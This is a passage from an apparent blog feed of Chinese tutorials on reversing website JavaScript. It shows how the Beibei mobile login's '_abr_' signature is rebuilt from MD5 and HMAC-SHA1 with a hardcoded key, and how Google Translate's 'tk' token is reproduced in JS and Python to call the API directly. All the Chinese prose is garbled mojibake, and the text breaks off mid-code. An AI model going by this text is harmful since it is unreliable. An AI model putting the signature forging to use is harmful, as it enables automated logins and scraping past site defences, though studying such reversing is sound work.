alt=""></p><p>ç°åœ¨æŸ¥çœ‹<code>aes</code>å‡½æ•°å…·ä½“çš„å†…å®¹ï¼Œå‘ç°äº†åˆæœ‰<code>k</code>å’Œ<code>iv</code>ï¼Œå¹¶ä¸”æœ‰ä¸ªCryptoJSå¯¹è±¡</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601095717.png" alt=""></p><p>å…¨å±€æœç´¢CryptoJSï¼Œå‘ç°äº†<code>crypto-js.js</code>æ–‡ä»¶ï¼Œæ˜æ˜¾è¿™æ˜¯CryptoJSåŠ å¯†åº“</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601100429.png" alt=""></p><p>å¹¶ä¸”å‘ç°è¿˜ç”¨äº†<code>$(selector).action()</code>çš„jQueryè¯­æ³•ï¼Œæ‰€ä»¥è¿˜éœ€è¦è½½å…¥jQueryåº“</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601112445.png" alt=""></p><p>ä»ç½‘ä¸Šä¸‹è½½å•ç‹¬çš„CryptoJSåº“æ–‡ä»¶å¼•å…¥ï¼Œä» ç½‘é¡µä¸­è·å–jQueryé“¾æ¥ï¼Œå¹¶è½½å…¥ jQueryï¼Œç„¶åå°†<code>aes</code>å‡½æ•°ä¹Ÿæ‹‰ä¸‹æ¥</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113127.png" alt=""></p><p>æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113229.png" alt=""></p><h3 id="è´è´ç½‘">è´è´ç½‘</h3><p>ç›®æ ‡ç½‘å€ï¼š<a href="https://m.beibei.com/login/login.html" target="_blank" rel="noopener">https://m.beibei.com/login/login.html</a> ï¼ˆéœ€æ‰‹æœºç«¯ï¼‰</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601154549.png" alt=""></p><p>è¾“å…¥å¸å·å¯†ç åŠéªŒè¯ç è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°ä¸€ä¸ªXHRè¯·æ±‚ï¼Œç±»å‹ä¸ºPOSTï¼Œæäº¤çš„è¡¨å•æ•°æ®ä¸­çš„ç”¨æˆ·åå¯†ç éƒ½ä¸ºæ˜æ–‡ï¼Œä½†é—®é¢˜åœ¨äºè¯·æ±‚å‚æ•°ä¸­çš„<code>_abr_</code>ä¸€ç›´åœ¨å˜åŒ–ï¼ŒçŒœæµ‹å®ƒä¸ºåŠ å¯†å‚æ•°</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601155448.png" alt=""></p><p>å…¨å±€æœç´¢<code>_abr_</code>æ— æœï¼Œåªèƒ½æ‰“è¯·æ±‚æ–­ç‚¹ï¼ŒæˆåŠŸæ–­ä½</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601160354.png" alt=""></p><p>ä½†æ˜¯å‘ç°æ–­ç‚¹çš„ä½ç½®æ²¡æœ‰æˆ‘ä»¬è¦çš„å†…å®¹ï¼Œäºæ˜¯åœ¨call Stackä¸­å¾€ä¸‹æ‰¾è°ƒç”¨æ ˆï¼Œcall Stackå†…çš„æ–¹æ³•è°ƒç”¨æ ˆçš„è§„åˆ™æ˜¯ä»ä¸Šåˆ°ä¸‹ç”±æœ€æ–°è°ƒç”¨å¤„ä¾æ¬¡å¾€ä¸‹æ’åˆ—ã€‚åœ¨<code>e.ajax</code>ä¸­å‘ç°äº†åŒ…å«æœ‰<code>_abr_</code>çš„å†…å®¹ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯è¦å‘é€å‡ºå»äº†ï¼Œæ²¡æœ‰å®ƒçš„äº§ç”Ÿè¿‡ç¨‹ï¼Œäºæ˜¯ç»§ç»­å¾€ä¸‹æ‰¾ï¼Œç»ˆäºæ‰¾åˆ°äº†<code>_abr_=</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163002.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163301.png" alt=""></p><p>è®°å½•<code>_abr_</code>çš„å€¼ä¸ºï¼šâ€œ013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1â€<br>å‘ç°<code>_abr_</code>å…¶å®æ˜¯ç”±<code>m(e.type, e.uri.pathname, e.query, e.form)</code>å‡½æ•°ç”Ÿæˆï¼Œäºæ˜¯ä¸ºäº†äº†è§£å®ƒçš„ç”Ÿæˆè¿‡ç¨‹ï¼Œåœ¨å‡½æ•°å‰æ‰“ä¸Šæ–­ç‚¹ï¼Œé‡æ–°å‘é€ç™»é™†è¯·æ±‚</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165214.png" alt=""></p><p>å•æ­¥è·Ÿè¸ªï¼Œå‘ç°äº†å…³é”®å‡½æ•°<code>MD5</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165852.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601170350.png" alt=""></p><p>ç»§ç»­å•æ­¥è·Ÿè¸ªï¼Œåˆå‘ç°äº†ä¸€ä¸ªå…³é”®å‡½æ•°<code>HMAC</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171039.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171405.png" alt=""></p><p>ç½‘ä¸ŠæŸ¥æ‰¾èµ„æ–™äº†è§£è¿™ä¸ªåŠ å¯†ç®—æ³•ï¼Œå‘ç°HMACç®—æ³•ï¼Œéœ€è¦ä¸€ä¸ªä¿¡æ¯æ‘˜è¦ç®—æ³•ä»¥åŠä¸€ä¸ªå¯†é’¥ï¼Œåœ¨ä¸‹æ–¹åˆæ‰¾åˆ°å…³é”®å‡½æ•°<code>HmacSHA1</code>ï¼Œäºæ˜¯æ¨æµ‹ä½¿ç”¨äº†SHA-1ç®—æ³•</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171755.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601185857.png" alt=""></p><p>ç»è¿‡é•¿æ—¶é—´çš„å•æ­¥è·Ÿè¸ªï¼Œæ€»ç®—æ¥åˆ°äº†ä¸€å¼€å§‹çš„å‡½æ•°è¿”å›å€¼éƒ¨åˆ†</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601174129.png" alt=""></p><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¼€å§‹åˆ†æï¼ŒHMACç®—æ³•å¯ä»¥ä½¿ç”¨Pythonç¬¬ä¸‰æ–¹åº“å®ç°ï¼Œå…ˆå°è¯•ä¸€ä¸‹ã€‚åŠ å¯†å†…å®¹æœ‰äº†ï¼Œå¯†é’¥ä¹Ÿæœ‰äº†ï¼ˆåŠ å¯†ç›®æ ‡å€¼å¯ä»¥ç”¨<code>JSON.stringify()</code>æå–ï¼‰<br>åŠ å¯†ç›®æ ‡å€¼ï¼šâ€œ01\nPOST\nb7da15fd7cdc2b8c73958ee82e7424aa\n/mroute.html?method=beibei.user.token.get\n1591002077â€<br>å¯†é’¥ï¼šâ€œytU7vwqIx2UXQNsiâ€</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601190441.png" alt=""></p><p>Pythonæµ‹è¯•æ•ˆæœå¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191001.png" alt=""></p><p>ä½†æ˜¯å‘ç°ï¼Œä¸<code>_abr</code>çš„å€¼ç›¸è¾ƒï¼Œå°‘äº†ä¸€äº›å†…å®¹ï¼Œå›è¿‡å¤´è§‚å¯Ÿï¼Œå‘ç°<code>_abr</code>çš„å€¼ç”±<code>a+m+h</code>ç»„æˆï¼Œ<code>a</code>ç»æµ‹è¯•æ˜¯å›ºå®šå€¼<code>01</code>ï¼Œ<code>m</code>å°±æ˜¯ç»è¿‡HMACåŠ å¯†åçš„å€¼ï¼Œ<code>h</code>ä¼šå˜åŠ¨ä¸”æš‚æ—¶è¿˜ä¸æ¸…æ¥š</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191307.png" alt=""></p><p>å¯¹<code>h</code>è¿›è¡Œåˆ†æï¼Œå‘ç°æ˜¯ç”±<code>s</code>çš„å€¼ä½¿ç”¨<code>toString(16)</code>å‡½æ•°å˜åŒ–è€Œæ¥ï¼Œè€Œ<code>s</code>åˆ™æ˜¯æ—¶é—´æˆ³(<code>new Date</code>)å˜åŒ–è€Œæ¥</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191707.png" alt=""></p><p>æå–å‡º<code>h</code>çš„ç®—æ³•ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼ŒæˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601194144.png" alt=""></p><p>æ¥ä¸‹æ¥ï¼Œåªå‰©ä¸‹éœ€è¦åŠ å¯†çš„å€¼ï¼Œå®ƒå¦‚ä½•äº§ç”Ÿçš„ï¼Œè§‚å¯Ÿå‘ç°ç”±<code>a + &quot;\n&quot; + e + &quot;\n&quot; + f + &quot;\n&quot; + p + &quot;\n&quot; + s</code>ç»„æˆï¼Œ<code>a</code>ã€<code>s</code>éƒ½æ¸…æ¥šäº†ï¼Œ<code>e</code>å‘ç°æ˜¯<code>POST</code>ï¼Œ<code>p</code>æ˜¯è·¯å¾„<code>/mroute.html?method=beibei.h5.login</code>ï¼Œè¿™ä¸¤ä¸ªä¹Ÿæ˜¯å›ºå®šå€¼ï¼Œåªå‰©ä¸‹<code>f</code>æ˜¯MD5åŠ å¯†åçš„å€¼ï¼Œé€†å‘<code>f</code>çš„äº§ç”Ÿè¿‡ç¨‹ï¼Œå‘ç°æ˜¯ç”±&quot;ç”¨æˆ·å+è·¯å¾„+ç™»é™†id&quot;äº§ç”Ÿè€Œæ¥ï¼Œå¦‚ï¼š<code>username=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010</code><br>æ‰€ä»¥ç°åœ¨åªéœ€è¦å°†è¿™ä¸ªå€¼MD5åŠ å¯†åä¼ å…¥å³å¯ï¼ŒåŒæ ·ä¹Ÿèƒ½ç”¨Pythonå®ç°</p><p>æœ€ç»ˆå®Œæˆçš„æ•ˆæœ<br><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601195839.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;è°·æ­Œå­¦æœ¯é•œåƒ&quot;&gt;è°·æ­Œå­¦æœ¯é•œåƒ&lt;/h3&gt;
&lt;p&gt;ç›®æ ‡ç½‘å€ï¼š&lt;a href=&quot;https://ac.scmor.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ac.scmor.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src
      
    
    </summary>
    
    
      <category term="JSé€†å‘" scheme="http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"/>
    
    
      <category term="JSé€†å‘ç³»åˆ—" scheme="http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>JSé€†å‘ç³»åˆ—ä¹‹è°·æ­Œç¿»è¯‘</title>
    <link href="http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/"/>
    <id>http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/</id>
    <published>2020-06-17T10:16:58.000Z</published>
    <updated>2020-06-17T10:25:36.955Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ä¸€ã€é€†å‘è°·æ­Œç¿»è¯‘">ä¸€ã€é€†å‘è°·æ­Œç¿»è¯‘</h3><h4 id="åˆ†æè¿‡ç¨‹">åˆ†æè¿‡ç¨‹</h4><ul><li>é¦–æ¬¡åˆ†æ</li></ul><p>é¦–å…ˆæ‰¾åˆ°è°·æ­Œç¿»è¯‘çš„Ajaxè¯·æ±‚æ¥å£</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529141646.png" alt=""></p><p>ä»¥getæ–¹å¼å‘é€çš„Ajaxè¯·æ±‚ï¼Œå¤šæ¬¡å°è¯•ï¼Œå‘ç°è¯·æ±‚å‚æ•°ä¸­ï¼Œ<code>tk</code>å’Œ<code>q</code>ï¼Œæ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œå…¶ä¸­<code>q</code>æ˜¯å¾…ç¿»è¯‘çš„å†…å®¹ï¼Œ<code>tk</code>æ˜¯æ ¹æ®<code>q</code>è¿›è¡ŒjsåŠ å¯†ç®—æ³•ç”Ÿæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ†æ<code>tk</code>çš„äº§ç”Ÿã€‚</p><ul><li>é€šè¿‡æ–­ç‚¹é€†å‘<code>tk</code>çš„åŠ å¯†ç®—æ³•</li></ul><p>åŠ å¯†ç®—æ³•åº”è¯¥åœ¨translate_m_zh-CN.jsæ–‡ä»¶é‡Œ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529142909.png" alt=""></p><p>æ‰“ä¸ªæ–­ç‚¹ï¼Œè¯·æ±‚ç¿»è¯‘æ¥å£çš„URLæ—¶åœæ­¢ï¼Œå‘ç°åœ¨send(a)ä¸­åœæ­¢äº†ï¼Œæ ¹æ®Call Stackçš„è°ƒç”¨å…³ç³»ï¼Œä¸€æ­¥æ­¥åˆ†æï¼Œæœ€ä¸Šé¢çš„å°±æ˜¯sendå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143414.png" alt=""></p><p>ä¾æ¬¡å¾€ä¸‹ç‚¹å‡»æ¯ä¸€ä¸ªè°ƒç”¨çš„å‡½æ•°ï¼Œå½“åˆ°äº†QEå‡½æ•°çš„æ—¶å€™ï¼Œå‘ç°äº†<code>tk</code>å‚æ•°æ¥è‡ªbï¼Œbåˆæ˜æ˜¾æ¥è‡ªc</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143742.png" alt=""></p><p>äºæ˜¯æˆ‘ä»¬é¡ºè—¤æ‘¸ç“œï¼Œå‘ç°cæ˜¯ç”±PE(d)äº§ç”Ÿçš„ï¼ŒPEåˆæ˜¯æ¥è‡ªpu(a)å‡½æ•°ï¼Œæˆ‘ä»¬è·³è½¬åˆ°puå‡½æ•°çš„ä½ç½®ï¼Œä¼¼ä¹å·²ç»æœ‰äº†ç­”æ¡ˆ</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144207.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144416.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144520.png" alt=""></p><ul><li>åˆ†æç”Ÿæˆ<code>tk</code>çš„JSä»£ç </li></ul><p>å¦‚ä¸‹æ˜¯æˆ‘ä»¬åˆšè·å–çš„JSä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  , nu = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">"a"</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">"+"</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">"+"</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">  , ou = <span class="literal">null</span></span><br><span class="line">  , pu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== ou)</span><br><span class="line">        <span class="keyword">var</span> b = ou;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        b = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>));</span><br><span class="line">        <span class="keyword">var</span> c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">75</span>));</span><br><span class="line">        b = [b(), b()];</span><br><span class="line">        b[<span class="number">1</span>] = c();</span><br><span class="line">        b = (ou = <span class="built_in">window</span>[b.join(c())] || <span class="string">""</span>) || <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> d = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>));</span><br><span class="line">    c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>));</span><br><span class="line">    d = [d(), d()];</span><br><span class="line">    d[<span class="number">1</span>] = c();</span><br><span class="line">    c = <span class="string">"&amp;"</span> + d.join(<span class="string">""</span>) + <span class="string">"="</span>;</span><br><span class="line">    d = b.split(<span class="string">"."</span>);</span><br><span class="line">    b = <span class="built_in">Number</span>(d[<span class="number">0</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h : (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>),</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">        e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">"+-a^+6"</span>);</span><br><span class="line">    a = nu(a, <span class="string">"+-3^+b+-f"</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> c + (a.toString() + <span class="string">"."</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å‘ç°åšäº†å¾ˆå¤šä¸å¿…è¦çš„æ“ä½œã€ç”šè‡³å¤šæ­¤ä¸€ä¸¾ï¼Œç›®çš„æ˜¯ç”¨äºæ··æ·†<br>å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var mu &#x3D; function(a) &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜ç”¨äº†<code>.fromCharCode()</code>å‡½æ•°ï¼ŒæŠŠæ•°å­—è½¬æ¢ä¸ºå­—æ¯ï¼Œæ˜æ˜¾å¤šæ­¤ä¸€ä¸¾çš„æ“ä½œã€‚ä½†æ˜¯ï¼Œé€šè¿‡åˆ†æï¼Œå‘ç°<code>tk</code>ç”Ÿæˆéœ€è¦å¦ä¸€æ ·ä¸œè¥¿ï¼Œå°±æ˜¯<code>tkk</code>è¿™ä¸ªå‚æ•°ï¼Œæ¥æºäºç½‘é¡µæºä»£ç ä¸Šï¼Œå¯»æ‰¾ä¸€ç•ªï¼Œè¿˜æ˜¯å‘ç°äº†ï¼Œå¤šæ¬¡å°è¯•ï¼Œå‘ç°è¿™ä¸ªå€¼æ˜¯å›ºå®šçš„</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529145556.png" alt=""></p><h4 id="å…·ä½“å®ç°">å…·ä½“å®ç°</h4><p>è¯´æ˜ï¼šjsæ–‡ä»¶åšäº†ç²¾ç‚¼ï¼ŒæŠŠä¸å¿…è¦çš„å€¼å»æ‰äº†ï¼Œå®è¡Œçš„æ•ˆæœæ˜¯è‹±è¯‘ä¸­ï¼Œä¸åŒè¯­è¨€çš„ç¿»è¯‘ä¿®æ”¹è¯·æ±‚çš„å‚æ•°å³å¯</p><ul><li>Pythonè„šæœ¬</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tk</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'google_tk.js'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        js = f.read()</span><br><span class="line">    j = execjs.compile(js)</span><br><span class="line">    tk = j.call(<span class="string">'pu'</span>, q)</span><br><span class="line">    <span class="keyword">return</span> tk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate_google</span><span class="params">()</span>:</span></span><br><span class="line">    q = input(<span class="string">"è¯·è¾“å…¥ä½ è¦ç¿»è¯‘çš„å†…å®¹ï¼š"</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"user-agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"referer"</span>: <span class="string">"https://translate.google.cn/"</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">"https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk="</span> + get_tk(</span><br><span class="line">        q) + <span class="string">"&amp;q="</span> + q</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    data = res.content.decode()</span><br><span class="line">    json_data = json.loads(data)</span><br><span class="line">    print(json_data[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    translate_google()</span><br></pre></td></tr></table></figure><ul><li>tk.js</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//tkk = '441865.2154418832';</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">"a"</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">"+"</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">"+"</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">pu = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    tkk=<span class="string">'441865.2154418832'</span>;</span><br><span class="line">    <span class="keyword">var</span> d = tkk.split(<span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Number</span>(d[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h :</span><br><span class="line">            (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> :</span><br><span class="line">                    (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>), e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>, e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) :</span><br><span class="line">                        e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>, e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>), e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">"+-a^+6"</span>);</span><br><span class="line">    a = nu(a, <span class="string">"+-3^+b+-f"</span>);</span><br><span 